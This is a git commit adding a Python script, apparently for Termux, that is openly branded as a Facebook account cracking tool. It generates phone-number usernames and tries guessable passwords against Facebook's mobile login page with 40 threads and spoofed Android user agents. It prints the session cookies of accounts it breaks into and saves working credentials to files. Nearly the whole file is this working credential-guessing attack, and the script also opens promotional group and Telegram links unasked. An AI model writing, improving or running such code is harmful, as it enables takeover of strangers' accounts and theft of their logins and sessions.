34ca9bb3e9f08288439be5ffcd1c4aaa21f4fd83
sojibking123 <151219647+sojibking123@users.noreply.github.com>
2023-11-19 05:31:06 +0600

    Create SM3.py

---
+++ SM3.py
@@ -0,0 +1,224 @@
+# Gift By SOJIB
+# Telegram Id : @SOJIB_404
+# Telegram : https://t.me/fb_crack_termux_all_free_command
+# Facebook Group : https://facebook.com/groups/1713018672413612/
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+try:
+    import requests
+except ImportError:
+    print('\n [âœ“] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [âœ“] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [âœ“] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+P = '\x1b[1;97m' # 
+M = '\033[1;33m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;96m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+id = []
+user = []
+oks = []
+cps = []
+loop = 0
+ugen=[]
+for ua in range(10000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      aalhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(aalhaj)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhhaj)
+os.system("xdg-open https://m.facebook.com/groups/311280858429214/")
+logo =("""
+
+\033[38;5;46m   _____ __  __                    
+\033[38;5;46m  / ____|  \/  |                   
+ \033[38;5;46m| (___ | \  / |                   
+ \x1b[38;5;196m \___ \| |\/| |                   
+\x1b[38;5;196m  ____) | |  | |                   
+\033[35;1m |_____/|_|__|_|     _ _____ ____  
+\033[38;5;46m  / ____|/ __ \     | |_   _|  _ \ 
+ \033[38;5;46m| (___ | |  | |    | | | | | |_) |
+ \x1b[38;5;196m \___ \| |  | |_   | | | | |  _ < 
+  \033[35;1m____) | |__| | |__| |_| |_| |_) |
+ \x1b[38;5;196m|_____/ \____/ \____/|_____|____/ 
+                                   
+                                  
+\033[1;91mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+\033[1;92m   	SK SOJIB
+\033[1;91mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+""") 
+ 
+def SOJIB():
+    os.system('clear')
+    os.system('xdg-open https://m.facebook.com/groups/311280858429214/')
+    print(logo)
+    print("")
+    print("\033[1;96m â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
+    print("\033[1;36m â•‘  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m áŽ¡áŽªÎáŽ Ï´áŽ· áŸážÏ´ÎáŽ¬ á´áŽ         \033[1;36mâ•‘")
+    print("\033[1;96m â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£")
+    print(" \033[1;36mâ•‘  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m áŽ«Ï´á†Î áŽ·Æ³ Ò’á´ á€áŽ¡Ï´á‚®á¢       \033[1;36mâ•‘")
+    print(" \033[1;36mâ•‘  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m áŽ«Ï´á†Î áŽ·Æ³ MS á€áŽ¡Ï´á‚®á¢       \033[1;36mâ•‘")
+    print("\033[1;36m â•‘  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m áŽ¬Ð¥á†Í²                   \033[1;36mâ•‘")
+    print("\033[1;96m â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
+    print("")
+    SOJIB = input(f'\033[1;32m ÕáŽ¬ážáŽ¬áŸÍ²áŽ¬áŽ  Æ³Ï´á‚®áŽ¡ Ï´á¢Í²á†Ï´Î :\033[1;36m ')
+    if SOJIB in ["1","A"]:
+        SOJIBs()
+    if SOJIB in ["2","B"]:
+        os.system('xdg-open https://www.facebook.com/groups/311280858429214/?ref=share')
+    if SOJIB in ["3","C"]:
+        os.system('xdg-open https://t.me/+ZM-TEwwCP3sxODY1')
+    if SOJIB in ["0","X"]:
+        os.system('exit')
+
+def SOJIBs():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print("\033[1;91mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
+    print("\033[1;31mâ•‘\033[1;36m  Æ³Ï´á‚®áŽ¡ Õá†áŽ· áŸÏ´áŽ áŽ¬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  â•‘")
+    print("\033[1;91mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
+    code = input('\033[1;32m Æ³Ï´á‚®áŽ¡ Õá†áŽ· áŸÏ´áŽ áŽ¬ :\033[1;36m ')
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100078348001110&mibextid=ZbWKwL')
+    print(logo)
+    print("\033[1;91mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
+    print("\033[1;31mâ•‘\033[1;36m  Æ³Ï´á‚®áŽ¡ áŸáŽ¡áŽªáŸá¦ ážá†áŽ·á†Í² : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m â•‘")
+    print("\033[1;91mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
+    limit=int(input("\033[1;32m Æ³Ï´á‚®áŽ¡ áŸáŽ¡áŽªáŸá¦ ážá†áŽ·á†Í² :\033[1;36m "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;91mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
+        print(f'\033[1;91mâ•‘\033[1;92m Æ³Ï´á‚®áŽ¡ Õá†áŽ· áŸÏ´áŽ áŽ¬ : '+code) 
+        print(f'\033[1;91mâ•‘\033[1;92m Æ³Ï´á‚®áŽ¡ Í²Ï´Í²áŽªáž á†áŽ  : '+tl)
+        print(f'\033[1;91mâ•‘\033[1;92m á€á†Ò’Í² á´Æ³ áŽªážáŽ»áŽªáŽ« ')
+        print("\033[1;91mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
+        for love in user:
+            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
+            uid = code+love
+            Fb_crack.submit(SOJIBm,uid,pwx,tl)
+    print("\033[1;91mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
+    print(' \033[1;91m[\033[1;92mðŸ˜š\033[1;91m]\033[1;92m HACKED COMPLETE ')
+    print(' \033[1;91m[\033[1;92mðŸ˜š\033[1;91m]\033[1;92m HI IM SOJIB ')
+    print("\033[1;91mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
+
+
+def SOJIBm(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;91m[\033[1;92mÕáŽ¬áŽªáŽ¡áŸáŽ»á†Îá€\033[1;91m]ðŸ¤­[\033[1;92m%s\033[1;91m]ðŸ˜œ[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'referer': 'https://mbasic.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,
+    'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\033[1;96m[\033[1;92mÒ’á´-áŸáŽ¡áŽªáŸá¦-Ï´á¦\033[1;96m]\033[1;92m '+uid+' \033[1;96mâ—‰\033[1;92m '+ps+'')
+                print(f'\033[1;36máŸÏ´Ï´á¦á†áŽ¬ : \033[1;35m'+coki)
+                open('/sdcard/SOJIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;90m[Ò’á´-áŸáŽ¡áŽªáŸá¦-áŸá¢] '+uid+' â—‰ '+ps+' \n')
+                open('/sdcard/SOJIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+ 
+SOJIB()
